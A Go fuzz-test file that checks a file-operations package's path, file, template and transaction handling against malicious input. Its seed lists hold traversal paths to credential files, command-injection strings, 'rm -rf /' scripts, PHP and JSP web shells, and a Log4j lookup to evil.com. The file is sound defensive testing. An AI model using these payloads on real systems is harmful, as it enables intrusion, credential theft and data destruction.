// pkg/fileops/fileops_fuzz_test.go
//go:build go1.18
// +build go1.18

package fileops

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf8"

	"go.uber.org/zap/zaptest"
)

// FuzzPathOperations tests path manipulation for security vulnerabilities
func FuzzPathOperations(f *testing.F) {
	// Seed with various path traversal attempts
	seeds := []string{
		"normal/path/file.txt",
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"/etc/passwd",
		"C:\\Windows\\System32\\config\\SAM",
		"./normal/./path/../file.txt",
		"~/.ssh/id_rsa",
		"$HOME/.bashrc",
		"${HOME}/.profile",
		"$(echo /etc/passwd)",
		"`cat /etc/passwd`",
		"|cat /etc/passwd",
		";cat /etc/passwd",
		"&cat /etc/passwd",
		"normal\x00/etc/passwd",
		"normal%00/etc/passwd",
		"normal%2F..%2F..%2Fetc%2Fpasswd",
		"normal%252F..%252F..%252Fetc%252Fpasswd",
		"....//....//....//etc/passwd",
		"..././..././..././etc/passwd",
		"normal/path\r\n/etc/passwd",
		"normal/path\n/etc/passwd",
		strings.Repeat("../", 100) + "etc/passwd",
		strings.Repeat("A", 10000), // Long path
		"con", // Windows reserved name
		"prn", // Windows reserved name
		"aux", // Windows reserved name
		"nul", // Windows reserved name
		"com1", // Windows reserved name
		"lpt1", // Windows reserved name
		"file:///etc/passwd",
		"\\\\server\\share\\file",
		"//server/share/file",
		"\\/\\/\\/etc/passwd",
		"C:../../../etc/passwd",
		"normal/../../etc/passwd",
		"normal/../../../../../../../../../../../etc/passwd",
		"normal/./././././././././././././././etc/passwd",
		"normal/path/to/file.txt/../../../../../../etc/passwd",
		"normal/path/to/file.txt%00.jpg",
		"☃/❄/🎅", // Unicode
		"\x00\x01\x02\x03", // Control characters
		"normal/path/../../../.ssh/authorized_keys",
		"normal/path/../../../.aws/credentials",
		"normal/path/../../../.docker/config.json",
		"normal/path/../../../.kube/config",
		"normal/path/../../../.git/config",
		"a" + strings.Repeat("/b", 1000), // Deep nesting
		"symlink -> /etc/passwd",
		"hardlink => /etc/passwd",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	pathOps := NewPathOperations()

	f.Fuzz(func(t *testing.T, path string) {
		// Skip invalid UTF-8
		if !utf8.ValidString(path) {
			t.Skip("Invalid UTF-8 string")
		}

		// Test CleanPath
		cleaned := pathOps.CleanPath(path)
		
		// Check for path traversal indicators in cleaned path
		if strings.Contains(path, "..") && !strings.Contains(cleaned, "..") {
			// This is good - path traversal was neutralized
			t.Logf("Path traversal neutralized: %s -> %s", path, cleaned)
		}

		// Test JoinPath with potentially malicious segments
		segments := strings.Split(path, string(filepath.Separator))
		joined := pathOps.JoinPath(segments...)
		
		// Verify no null bytes in result
		if strings.Contains(joined, "\x00") {
			// This is actually good - we're detecting a security issue
			t.Logf("Security: Null byte detected in joined path: %q", joined)
		}

		// Test ExpandPath
		expanded := pathOps.ExpandPath(path)
		
		// Check for command injection indicators
		if strings.ContainsAny(path, "$`|;&") && expanded != path {
			// Check if expansion led to unexpected results
			if strings.Contains(expanded, "/etc/passwd") && !strings.Contains(path, "/etc/passwd") {
				t.Errorf("Potential command injection via path expansion: %s -> %s", path, expanded)
			}
		}

		// Test IsAbsPath
		isAbs := pathOps.IsAbsPath(path)
		if isAbs {
			// Absolute paths could be attempting to access system files
			if strings.Contains(strings.ToLower(path), "etc/passwd") ||
			   strings.Contains(strings.ToLower(path), "windows/system32") {
				t.Logf("Warning: Absolute path to sensitive location: %s", path)
			}
		}

		// Test BaseName and DirName
		base := pathOps.BaseName(path)
		_ = pathOps.DirName(path) // dir not used but we test the function
		
		// Verify no path separators in basename (except for edge cases)
		if base != path && strings.ContainsAny(base, "/\\") {
			// filepath.Base() returns the original path if it's all separators
			t.Logf("Note: Path separator in basename: %s from %s", base, path)
		}

		// Test RelPath if path appears to be attempting traversal
		if strings.Contains(path, "..") {
			safeBase := "/safe/base/dir"
			_, err := pathOps.RelPath(safeBase, path)
			// Error is OK here - we're testing handling of malicious input
			_ = err
		}
	})
}

// FuzzFileOperations tests file operations for security vulnerabilities
func FuzzFileOperations(f *testing.F) {
	// Seed with various file contents and names
	seeds := []struct {
		filename string
		content  string
	}{
		{"normal.txt", "normal content"},
		{"../../../etc/passwd", "should not write here"},
		{"/etc/passwd", "should not write here"},
		{"file\x00.txt", "null byte in name"},
		{"file%00.txt", "encoded null"},
		{"con", "windows reserved"},
		{"prn.txt", "windows reserved with extension"},
		{strings.Repeat("a", 300) + ".txt", "long filename"},
		{"file.txt", strings.Repeat("A", 10*1024*1024)}, // 10MB content
		{"file.txt", "\x00\x01\x02\x03"}, // Binary content
		{"file.txt", "line1\r\nline2\r\nline3"}, // CRLF
		{"file.txt", "#!/bin/bash\nrm -rf /"}, // Malicious script
		{"file.php", "<?php system($_GET['cmd']); ?>"}, // PHP shell
		{"file.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"}, // JSP shell
		{"file.txt", "${jndi:ldap://evil.com/a}"}, // Log4j
		{"file.txt", "{{7*7}}"}, // Template injection
		{".htaccess", "Options +Indexes"}, // Apache config
		{"web.config", "<?xml version=\"1.0\"?><configuration></configuration>"}, // IIS config
		{".git/config", "[core]\nrepositoryformatversion = 0"}, // Git config
		{".ssh/authorized_keys", "ssh-rsa AAAAB3NzaC1yc2EA..."}, // SSH keys
		{"../../.bashrc", "alias ls='rm -rf /'"}, // Shell config
		{"symlink", "link -> /etc/passwd"}, // Symlink content
		{"file:test.txt", "colon in filename"},
		{"file|test.txt", "pipe in filename"},
		{"file>test.txt", "redirect in filename"},
		{"file<test.txt", "redirect in filename"},
		{"file&test.txt", "ampersand in filename"},
		{"file;test.txt", "semicolon in filename"},
		{"file`test.txt", "backtick in filename"},
		{"file$(test).txt", "subshell in filename"},
		{"file\ntest.txt", "newline in filename"},
		{"file\rtest.txt", "carriage return in filename"},
		{"file\ttest.txt", "tab in filename"},
	}

	for _, seed := range seeds {
		f.Add(seed.filename, seed.content)
	}

	f.Fuzz(func(t *testing.T, filename string, content string) {
		// Skip invalid UTF-8
		if !utf8.ValidString(filename) || !utf8.ValidString(content) {
			t.Skip("Invalid UTF-8")
		}

		logger := zaptest.NewLogger(t)
		fileOps := NewFileSystemOperations(logger)
		ctx := context.Background()

		// Create a temporary directory for safe testing
		tempDir := t.TempDir()
		
		// Attempt to join filename with temp directory
		testPath := filepath.Join(tempDir, filename)
		
		// Check if the resulting path is still within tempDir
		absTestPath, err := filepath.Abs(testPath)
		if err == nil {
			absTempDir, _ := filepath.Abs(tempDir)
			if !strings.HasPrefix(absTestPath, absTempDir) {
				t.Logf("Path escape detected: %s escapes %s", testPath, tempDir)
				return // Don't proceed with operations outside temp dir
			}
		}

		// Test WriteFile
		err = fileOps.WriteFile(ctx, testPath, []byte(content), 0644)
		if err != nil {
			// Some filenames are invalid - this is expected
			if strings.ContainsAny(filename, "\x00") {
				return // Null bytes in filenames should fail
			}
			// Check for other interesting errors
			if strings.Contains(err.Error(), "permission denied") {
				t.Logf("Permission denied writing to: %s", testPath)
			}
			return
		}

		// If write succeeded, verify it wrote to the correct location
		if _, err := os.Stat(testPath); err == nil {
			// File exists - verify it's in the safe directory
			if !strings.HasPrefix(testPath, tempDir) {
				t.Errorf("File written outside temp directory: %s", testPath)
			}
		}

		// Test ReadFile
		data, err := fileOps.ReadFile(ctx, testPath)
		if err == nil {
			if !strings.HasPrefix(testPath, tempDir) {
				t.Errorf("File read from outside temp directory: %s", testPath)
			}
			// Verify content matches
			if string(data) != content {
				if len(content) < 1000 { // Only log short content
					t.Errorf("Content mismatch: got %q, want %q", string(data), content)
				}
			}
		}

		// Test CopyFile
		copyDest := filepath.Join(tempDir, "copy_"+filepath.Base(filename))
		err = fileOps.CopyFile(ctx, testPath, copyDest, 0644)
		if err == nil && !strings.HasPrefix(copyDest, tempDir) {
			t.Errorf("File copied outside temp directory: %s", copyDest)
		}

		// Test DeleteFile
		err = fileOps.DeleteFile(ctx, testPath)
		if err == nil && !strings.HasPrefix(testPath, tempDir) {
			t.Errorf("Attempted to delete file outside temp directory: %s", testPath)
		}
	})
}

// FuzzTemplateOperations tests template operations for injection vulnerabilities
func FuzzTemplateOperations(f *testing.F) {
	// Seed with various template injection attempts
	seeds := []struct {
		template string
		vars     map[string]string
	}{
		{
			template: "Hello {{.Name}}!",
			vars:     map[string]string{"Name": "World"},
		},
		{
			template: "{{.}}",
			vars:     map[string]string{"Value": "test"},
		},
		{
			template: "{{.Name}} {{.Name}}",
			vars:     map[string]string{"Name": "{{.Secret}}"},
		},
		{
			template: "{{range .}}{{.}}{{end}}",
			vars:     map[string]string{"Item": "value"},
		},
		{
			template: "{{ .Name | printf \"%s\" }}",
			vars:     map[string]string{"Name": "<script>alert(1)</script>"},
		},
		{
			template: "{{.Name}}",
			vars:     map[string]string{"Name": "'; DROP TABLE users; --"},
		},
		{
			template: "{{.Path}}",
			vars:     map[string]string{"Path": "../../../etc/passwd"},
		},
		{
			template: "{{.Cmd}}",
			vars:     map[string]string{"Cmd": "`rm -rf /`"},
		},
		{
			template: "{{.Expr}}",
			vars:     map[string]string{"Expr": "{{7*7}}"},
		},
		{
			template: "{{ .Name }}",
			vars:     map[string]string{"Name": "${jndi:ldap://evil.com/a}"},
		},
		{
			template: "{{.Input}}",
			vars:     map[string]string{"Input": "{{define \"T\"}}evil{{end}}{{template \"T\"}}"},
		},
		{
			template: "{{.Data}}",
			vars:     map[string]string{"Data": "{{range $i := iterate 1000000}}{{$i}}{{end}}"},
		},
		{
			template: "{{.User}}",
			vars:     map[string]string{"User": "\"><script>alert(document.cookie)</script>"},
		},
		{
			template: "{{.File}}",
			vars:     map[string]string{"File": "{{template \"/etc/passwd\"}}"},
		},
		{
			template: strings.Repeat("{{.A}}", 1000),
			vars:     map[string]string{"A": "a"},
		},
		{
			template: "{{.Content}}",
			vars:     map[string]string{"Content": strings.Repeat("A", 1000000)},
		},
	}

	for _, seed := range seeds {
		// Flatten vars map for fuzzing
		var varStr string
		for k, v := range seed.vars {
			varStr += k + ":" + v + ";"
		}
		f.Add(seed.template, varStr)
	}

	f.Fuzz(func(t *testing.T, template string, varsStr string) {
		// Skip invalid UTF-8
		if !utf8.ValidString(template) || !utf8.ValidString(varsStr) {
			t.Skip("Invalid UTF-8")
		}

		// Parse vars string back to map
		vars := make(map[string]string)
		parts := strings.Split(varsStr, ";")
		for _, part := range parts {
			if kv := strings.SplitN(part, ":", 2); len(kv) == 2 {
				vars[kv[0]] = kv[1]
			}
		}

		logger := zaptest.NewLogger(t)
		fileOps := NewFileSystemOperations(logger)
		pathOps := NewPathOperations()
		templateOps := NewTemplateOperations(fileOps, pathOps, logger)

		// Create safe output path
		tempDir := t.TempDir()
		outputPath := filepath.Join(tempDir, "output.txt")

		// Create template file
		templatePath := filepath.Join(tempDir, "template.txt")
		if err := os.WriteFile(templatePath, []byte(template), 0644); err != nil {
			return
		}

		// Test ProcessTemplate
		ctx := context.Background()
		err := templateOps.ProcessTemplate(ctx, templatePath, outputPath, vars)
		
		if err != nil {
			// Template errors are expected for malicious input
			errStr := err.Error()
			
			// Check for template injection indicators
			if strings.Contains(errStr, "function") && strings.Contains(template, "range") {
				t.Logf("Potential template injection blocked: %s", template)
			}
			return
		}

		// If template succeeded, check output
		if output, err := os.ReadFile(outputPath); err == nil {
			outputStr := string(output)
			
			// Check for successful injections
			if strings.Contains(template, "7*7") && strings.Contains(outputStr, "49") {
				t.Errorf("Math expression evaluated in template: %s -> %s", template, outputStr)
			}
			
			// Check for path traversal in output
			if strings.Contains(outputStr, "/etc/passwd") && !strings.Contains(template, "/etc/passwd") {
				t.Errorf("Path traversal in template output: %s", outputStr)
			}
			
			// Check for script injection
			if strings.Contains(outputStr, "<script>") && !strings.Contains(template, "<script>") {
				t.Logf("Warning: Unescaped script in output: %s", outputStr)
			}
			
			// Check output size (DoS prevention)
			if len(output) > 10*1024*1024 { // 10MB
				t.Errorf("Excessive output size: %d bytes", len(output))
			}
		}
	})
}

// FuzzSafeOperations tests safe file operations for race conditions and atomicity
func FuzzSafeOperations(f *testing.F) {
	// Seed with various operation sequences
	seeds := []struct {
		operations []FileOperation
	}{
		{
			operations: []FileOperation{
				{Type: OpCreate, Target: "file1.txt", Content: []byte("content1")},
				{Type: OpCopy, Source: "file1.txt", Target: "file2.txt"},
				{Type: OpDelete, Target: "file1.txt"},
			},
		},
		{
			operations: []FileOperation{
				{Type: OpMkdir, Target: "dir1", Mode: 0755},
				{Type: OpCreate, Target: "dir1/file.txt", Content: []byte("test")},
				{Type: OpMove, Source: "dir1/file.txt", Target: "file.txt"},
			},
		},
		{
			operations: []FileOperation{
				{Type: OpCreate, Target: "../outside.txt", Content: []byte("escape")},
			},
		},
		{
			operations: []FileOperation{
				{Type: OpCreate, Target: "file.txt", Content: []byte("original")},
				{Type: OpCreate, Target: "file.txt", Content: []byte("overwrite")},
			},
		},
		{
			operations: []FileOperation{
				{Type: OpDelete, Target: "/etc/passwd"},
			},
		},
	}

	// Convert to simpler format for fuzzing
	for _, seed := range seeds {
		opsStr := ""
		for _, op := range seed.operations {
			opsStr += string(op.Type) + ":" + op.Source + ":" + op.Target + ";"
		}
		f.Add(opsStr)
	}

	f.Fuzz(func(t *testing.T, opsStr string) {
		if !utf8.ValidString(opsStr) {
			t.Skip("Invalid UTF-8")
		}

		// Parse operations string
		var operations []FileOperation
		parts := strings.Split(opsStr, ";")
		for _, part := range parts {
			fields := strings.SplitN(part, ":", 3)
			if len(fields) >= 2 {
				op := FileOperation{
					Type:   FileOperationType(fields[0]),
					Target: fields[1],
				}
				if len(fields) >= 3 {
					op.Source = fields[1]
					op.Target = fields[2]
				}
				operations = append(operations, op)
			}
		}

		if len(operations) == 0 {
			return
		}

		logger := zaptest.NewLogger(t)
		fileOps := NewFileSystemOperations(logger)
		safeOps := NewSafeFileOperations(fileOps, logger)
		ctx := context.Background()

		// Create safe working directory
		tempDir := t.TempDir()

		// Adjust all operations to use temp directory
		for i := range operations {
			if operations[i].Source != "" {
				operations[i].Source = filepath.Join(tempDir, filepath.Base(operations[i].Source))
			}
			if operations[i].Target != "" {
				operations[i].Target = filepath.Join(tempDir, filepath.Base(operations[i].Target))
			}
		}

		// Test WithTransaction
		err := safeOps.WithTransaction(ctx, operations)
		
		if err != nil {
			// Transaction failed - verify rollback
			// This is hard to verify without knowing the state before operations
			t.Logf("Transaction failed as expected: %v", err)
		} else {
			// Transaction succeeded - verify all operations completed
			for i, op := range operations {
				switch op.Type {
				case OpCreate:
					if _, err := os.Stat(op.Target); os.IsNotExist(err) {
						t.Errorf("Create operation %d did not complete: %s", i, op.Target)
					}
				case OpDelete:
					if _, err := os.Stat(op.Target); err == nil {
						t.Errorf("Delete operation %d did not complete: %s", i, op.Target)
					}
				}
			}
		}
	})
}